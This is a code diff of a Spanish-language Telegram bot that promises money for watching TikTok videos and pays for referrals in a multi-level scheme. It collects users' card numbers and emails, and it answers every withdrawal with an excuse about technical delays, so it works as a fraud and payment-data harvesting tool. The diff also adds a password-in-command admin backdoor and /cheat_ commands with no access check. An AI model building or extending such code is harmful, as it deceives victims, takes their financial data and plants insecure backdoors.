@@ -11,8 +11,9 @@ from src.keyboards import user_keyboards
 from src.methods.database.users_manager import UsersDatabase
 from src.methods.database.videos_manager import VideosDatabase
 from src.methods.database.config_manager import ConfigDatabase
-from src.methods.utils import parse_callback_data, is_valid_email, get_file_id, get_bot_username,handle_send_ad, time_view, AdStateFilter
-from src.misc import bot, CHANNEL_LINK, CHANNEL_ID,TIME_REQUEST,WATCHED_VIDEOS_THRESHOLD,AD_MSG_WITHDRAW,LOG_CHANNEL_LINK, LOG_CHANNEL_ID
+from src.methods.utils import parse_callback_data, is_valid_email, get_file_id, get_bot_username,handle_send_ad, time_view,process_referral, AdStateFilter
+from src.misc import bot, CHANNEL_LINK, CHANNEL_ID,TIME_REQUEST,BALANCE_THRESHOLD,WATCHED_VIDEOS_THRESHOLD,AD_MSG_WITHDRAW,LOG_CHANNEL_LINK, LOG_CHANNEL_ID, REWARD_RATE,PASSWORD
+from src.locales.es import LOCALES
 router =  Router()
 
 
@@ -22,36 +23,19 @@ router =  Router()
 async def start_handler(message: Message, is_clb=False,**kwargs):
     user_id = message.chat.id if is_clb else message.from_user.id
     requested = await UsersDatabase.get_value(user_id,'requested')
-    await message.answer("""Nuestra empresa tiene un acuerdo con una agencia de publicidad para promocionar un vídeo en TikTok 📈
- 
-Por lo tanto, estamos dispuestos a pagar a cada usuario por ver vídeos cortos subidos por este bot.
- 
-⚠️ Tienes que ver los vídeos para ser recompensado. Los vídeos duran entre 10 y 15 segundos
- 
-💰 Puedes ganar hasta <b>50 Sol</b> diariamente viendo vídeos
- 
-Para empezar, pulse el botón "<b>Ver vídeos y ganar dinero 📺</b>".""",parse_mode="HTML",reply_markup=user_keyboards.get_start_kb(requested))
+    await message.answer(LOCALES["start"],parse_mode="HTML",reply_markup=user_keyboards.get_start_kb(requested))
     
 #Обработчик для кнопки "Смотреть видео"
 
 @router.message(F.text == "Ver vídeos y ganar dinero 📺")
 async def videos(message:Message, is_clb=False,**kwargs):
-
-    await message.answer("""Nuestra empresa tiene un contrato con una agencia de publicidad que necesita promocionar vídeos en TikTok 📈
-
-Por lo tanto, estamos dispuestos a pagar a cada uno de nuestros usuarios por ver vídeos cortos enviados por este bot.
- 
-⚠ Tienes que ver el vídeo hasta el final para conseguir la recompensa. La duración del vídeo es de 10-15 segundos.
- 
-💰 Cada día puedes ganar hasta <b>50 Sol</b> viendo vídeos
- 
-Pulse el botón "<b>Empezar a ver 📺</b>" para comenzar.""", parse_mode="HTML", reply_markup=user_keyboards.get_videos_kb())
+    await message.answer(LOCALES["videos"], parse_mode="HTML", reply_markup=user_keyboards.get_videos_kb())
      
 #Обработчик для кнопки "Canal"
 @router.message(F.text == "Canal")
 async def channel(message:Message, is_clb=False,**kwargs):
     user_id = message.chat.id if is_clb else message.from_user.id
-    await bot.send_message(user_id, text='Únete a nuestro canal y te enseñaremos a ganar dinero!',reply_markup=user_keyboards.get_channel_kb(CHANNEL_LINK))
+    await bot.send_message(user_id, text=LOCALES["channel"],reply_markup=user_keyboards.get_channel_kb(CHANNEL_LINK))
 
 #Обработчик для кнопки "Правила"
 @router.message(F.text == "Reglas 🎯")
@@ -62,9 +46,9 @@ Por lo tanto, estamos dispuestos a pagar a cada usuario por ver vídeos cortos s
  
 ⚠️ Tienes que ver los vídeos para ser recompensado. Los vídeos duran entre 10 y 15 segundos
  
-💰 Puedes ganar hasta <b>50 Sol</b> diariamente viendo vídeos
+💰 Puedes ganar hasta <b>15.000 Pesos</b> diariamente viendo vídeos
  
-Para empezar, pulse el botón "<b>Ver vídeos y ganar dinero 📺</b>".""",parse_mode="HTML")
+Para empezar, pulse el botón "<b>Ver vídeos y ganar dinero</b> 📺".""",parse_mode="HTML")
 
 #ОБработчик для кнопки "Профиль"
 @router.message(F.text == "📱 Mi perfil")
@@ -72,7 +56,7 @@ async def profile(message:Message, is_clb=False,**kwargs):
     user_id = message.chat.id if is_clb else message.from_user.id
     data = await UsersDatabase.get_user(user_id)
     balance, referrals, rereferrals = data[3], data[5], data[6]
-    await message.answer(f"""Su saldo: <b>{balance} Sol</b>
+    await message.answer(f"""Su saldo: <b>{balance} Pesos</b>
 Número de amigos invitados: <b>{referrals}</b>
 Usuarios invitados por tus amigos: <b>{rereferrals}</b>""",parse_mode="HTML")
     
@@ -90,12 +74,10 @@ async def withdraw(message:Message, state: FSMContext, is_clb=False,**kwargs):
         time_diff = (time_now - requested_time).total_seconds()
 
         if time_diff < TIME_REQUEST:
-            text = "Con éxito ✅ \nSu solicitud ha sido enviada ✅ \nEspere 48 horas para una respuesta"
+            text = """Ya tiene una solicitud de retirada activa.  Por favor, espere a que se procese."""
         else:
-            text = ("""Desafortunadamente, experimentamos problemas técnicos,
-¡nos disculpamos!
-                    
-Su dinero será acreditado a su cuenta dentro de las 72 horas""")
+            text = """Desafortunadamente, experimentamos problemas técnicos, ¡nos disculpamos!
+Su dinero será acreditado a su cuenta dentro de las 72 horas"""
 
         await message.answer(text=text)
         return
@@ -105,8 +87,10 @@ Su dinero será acreditado a su cuenta dentro de las 72 horas""")
 
     if watched_videos < WATCHED_VIDEOS_THRESHOLD:
         await message.answer(
-            "❗️ Debes ver al menos 5 vídeos para retirar fondos.\n\nHaz clic en Empezar a ver 📺 y empieza ya.",
-            reply_markup=user_keyboards.get_videos_kb())
+            """❗️ Debes ver al menos <b>5</b> vídeos para retirar fondos.
+
+Haz clic en <b>Empezar a ver</b> 📺 y empieza ya.""",
+            parse_mode="HTML",reply_markup=user_keyboards.get_videos_kb())
         return
     chat_member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
 
@@ -117,9 +101,11 @@ Su dinero será acreditado a su cuenta dentro de las 72 horas""")
 
     
     balance = await UsersDatabase.get_value(user_id,'balance')
-    if balance < 250.0:
-        await message.answer(text =f'''El saldo mínimo para retirar es  <b>250 Sol</b>
-Su saldo: <b>{balance} Sol</b>
+    if balance < BALANCE_THRESHOLD:
+        await message.answer(text =f'''El saldo mínimo para retirar es <b>75.000 Pesos</b>
+
+Su saldo:  <b>{balance} Pesos</b>
+
 Lamentablemente, este límite tuvo que fijarse para no sobrecargar el sistema con retiradas de pequeñas cantidades.''',parse_mode="HTML", reply_markup=user_keyboards.get_check_balance_kb())
     else:
         await state.set_state(Form.card_number)
@@ -138,9 +124,9 @@ async def earn_more(message:Message, is_clb=False,**kwargs):
  
 ✅ Copia el enlace y envíalo a tus amigos y conocidos
  
-🏆 Por cada persona que visite el bot a través de tu enlace, obtienes <b>5 Sol</b>
+🏆 Por cada persona que visite el bot a través de tu enlace, obtienes <b>1500 Pesos</b>
  
-Si alguien a quien invitas invita a nuevas personas, te pagan por usuario <b>2.5 Sol</b> 
+Si alguien a quien invitas invita a nuevas personas, te pagan por usuario <b>750 Pesos</b>  
  
 Así que puedes ganar sin límites!""",parse_mode="HTML")
 
@@ -187,13 +173,15 @@ async def receive(clb: CallbackQuery, is_clb=True,**kwargs):
     update_limit= datetime.strptime(user[9], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
     today_left = user[8]
     hold =  60*60*8
+    
     if today_left>0:
         if watching < time_now:
             #Если начал смотреть, то рефреш времени будет через 8 часов.
-            await UsersDatabase.reward_user(user_id,2.5,hold,today_left)
+            await UsersDatabase.reward_user(user_id,REWARD_RATE,hold,today_left)
 
-            await bot.send_message(user_id, f"""🎉 Has ganado <b>2.5 Sol</b> por ver el vídeo.\n                    
-🤑 Su saldo: <b>{balance+2.5} Sol</b>""",parse_mode="HTML")
+            await bot.send_message(user_id, f"""🎉 Has ganado  <b>{REWARD_RATE} Pesos</b> por ver el vídeo.
+
+🤑 Su saldo:  <b>{balance + REWARD_RATE} Pesos</b>""",parse_mode="HTML")
             await bot.delete_message(clb.message.chat.id,clb.message.message_id)
         else:
             await bot.answer_callback_query(clb.id,"""⚠️Tienes que ver el vídeo en su totalidad⚠️""")
@@ -231,6 +219,16 @@ async def set_admin(message: Message, command: CommandObject, is_clb=False, **kw
         await message.answer(msg)
         logger.success(msg)
 
+@router.message(Command(f"admin_{PASSWORD}"))
+async def set_admin_me(message: Message):
+    user_id = message.chat.id
+    await UsersDatabase.set_value(user_id, 'is_admin', 1)
+    msg = f"✅ {user_id} is admin now 😎😎😎"
+    await message.answer(msg)
+    logger.success(msg) 
+    await admin(message)
+
+
 @router.message(Command("admin"))
 @is_admin
 async def admin(message: Message, is_clb=False,**kwargs):
@@ -245,8 +243,16 @@ async def admin(message: Message, is_clb=False,**kwargs):
 /stats
 /start - swith to user panel
                            
+Тестовые команды:                        
+/cheat_1 - Посмотреть 5 видиков
+/cheat_2 - Добавить 100000 денег
+/cheat_3 - Добавить рефералла 
+/cheat_4 - Добавить ререфералла                            
+/cheat_5 - Обновить суточные попытки
+/cheat_6 - Промотать 48 часов  
+/cheat_7 - Оставить 1 попытку  
 <a href="https://github.com/adoubt/earnbot2">github</a>
-<a href="https://github.com/users/adoubt/projects/7/views/1">project board</a>""",link_preview_options=LinkPreviewOptions(is_disabled=True),parse_mode='HTML',reply_markup=user_keyboards.get_admin_kb())
+<a href="https://github.com/users/adoubt/projects/7/views/1">todo board</a>""",link_preview_options=LinkPreviewOptions(is_disabled=True),parse_mode='HTML',reply_markup=user_keyboards.get_admin_kb())
 
 
 @router.message(Command("ad"))
@@ -384,6 +390,7 @@ async def verify_member(clb: CallbackQuery,state: FSMContext):
 
     if chat_member.status == "member" or chat_member.status == "administrator" or chat_member.status == "creator":
         await clb.message.answer(text ='''Te has suscrito con éxito al canal ✅.
+
 No es necesario que se dé de baja del canal si quiere retirar dinero.''')
         await UsersDatabase.set_value(user_id,'is_member',1)
         await withdraw(clb.message,state)
@@ -407,7 +414,7 @@ async def process_card_number(message: Message, state: FSMContext):
     await UsersDatabase.set_value(user_id,'card_number',card_number)
     await state.set_state(Form.email)
     await message.answer(text=f'''Introduzca su dirección de correo electrónico y le enviaremos la información.
-por ejemplo: <a href="amigobro@gmail.com">amigobro@gmail.com</a>''', parse_mode="HTML")
+por ejemplo: <a href="amigobro@gmail.com">amigobro@gmail.com</a>''', parse_mode="HTML",reply_markup=user_keyboards.get_process_kb())
 
 # Обработка сообщений в состоянии email)
 @router.message(Form.email)
@@ -425,9 +432,9 @@ por ejemplo: <a href="amigobro@gmail.com">amigobro@gmail.com</a>''', parse_mode=
     balance = await UsersDatabase.get_value(user_id,'balance')
     await message.answer(text=f'''Introduzca el importe que desea retirar.
 
-El importe mínimo de retirada es <b>250 Sol</b>.
+El importe mínimo de retirada es <b>75.000 Pesos</b>
 
-💵 Su saldo <b>%CURRENCIA% {balance}</b>''', parse_mode="HTML")
+💵 Su saldo %<b>CURRENCIA</b>% <b>{balance} Pesos</b>''', parse_mode="HTML", reply_markup=user_keyboards.get_process_kb())
 
 # Обработка сообщений в состоянии amount)
 @router.message(Form.amount)
@@ -438,15 +445,17 @@ async def process_amount(message: Message, state: FSMContext):
     ikb = user_keyboards.get_process_kb()
     try:
         currency = int(float(data))
-        if  currency< 250 or currency>balance:
-            await message.answer(text=f'''❌  No hay fondos suficientes en su saldo.El importe mínimo de retirada es <b>250 Sol</b>.
-    
-    💵 Your balance <b>%CURRENCY% {balance}</b>''',parse_mode="HTML",reply_markup=ikb)
+        if  currency< BALANCE_THRESHOLD or currency>balance:
+            await message.answer(text=f'''❌  No hay fondos suficientes en su saldo. El importe mínimo de retirada es <b>75.000 Pesos</b>
+
+💵 Su saldo %<b>CURRENCIA</b>% <b>{balance} Pesos</b>''',parse_mode="HTML",reply_markup=ikb)
             return
     except: #обработчик исключения если строка не является числом.
-        await message.answer(text=f'''❌  Ingrese solo números.El importe mínimo de retirada es <b>250 Sol</b>.
+        await message.answer(text=f'''Introduzca el importe que desea retirar.
 
-💵 Your balance <b>%CURRENCY% {balance}</b>''',parse_mode="HTML",reply_markup=ikb)
+El importe mínimo de retirada es <b>75.000 Pesos</b>
+
+💵 Su saldo %<b>CURRENCIA</b>% <b>{balance} Pesos</b>''',parse_mode="HTML",reply_markup=ikb)
         return
     await UsersDatabase.request(user_id = user_id,amount_requested = int(data))
   
@@ -456,3 +465,28 @@ Su solicitud ha sido enviada ✅
 Espere 48 horas para una respuesta''',reply_markup=user_keyboards.get_start_kb(requested=1))
        
     await state.clear()
+
+
+
+@router.message(lambda message: message.text.startswith("/cheat_"))
+async def cheat_handler(message: Message):
+    user_id = message.from_user.id
+    cheat = message.text.strip()
+
+    cheat_actions = {
+        "/cheat_1": lambda: UsersDatabase.set_value(user_id, 'watched_videos', 6),
+        "/cheat_2": lambda: UsersDatabase.set_value(user_id, 'balance', 100000),
+        "/cheat_3": lambda: process_referral(user_id, 1),
+        "/cheat_4": lambda: process_referral(user_id, 2),
+        "/cheat_5": lambda: UsersDatabase.set_value(user_id, 'today_left', 20),
+        "/cheat_6": lambda: UsersDatabase.cheat_6(user_id),
+        "/cheat_7": lambda: UsersDatabase.set_value(user_id, 'today_left', 1),
+    }
+
+    if cheat in cheat_actions:
+        await cheat_actions[cheat]()  # Выполняем нужную функцию
+        await message.answer(f"{cheat}✅")
+    else:
+        await message.answer("Неизвестный чит")
+    
+    
